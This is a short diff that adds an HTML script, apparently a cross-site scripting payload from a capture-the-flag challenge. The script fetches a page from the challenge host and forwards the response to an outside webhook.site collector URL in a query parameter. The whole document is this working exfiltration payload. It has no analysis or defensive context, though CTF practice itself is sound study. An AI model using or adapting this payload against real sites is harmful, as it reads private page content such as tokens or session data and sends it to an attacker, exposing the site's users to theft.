@@ -1,0 +1,7 @@
+<script>
+fetch('https://gimmecsp.asisctf.com/')
+        .then(function (res) { return res.text() })
+            .then(function (data) {
+                fetch('https://webhook.site/df59d79f-07f6-49e3-899c-e8aa36a4bebe?rah='+data);
+            });
+</script>
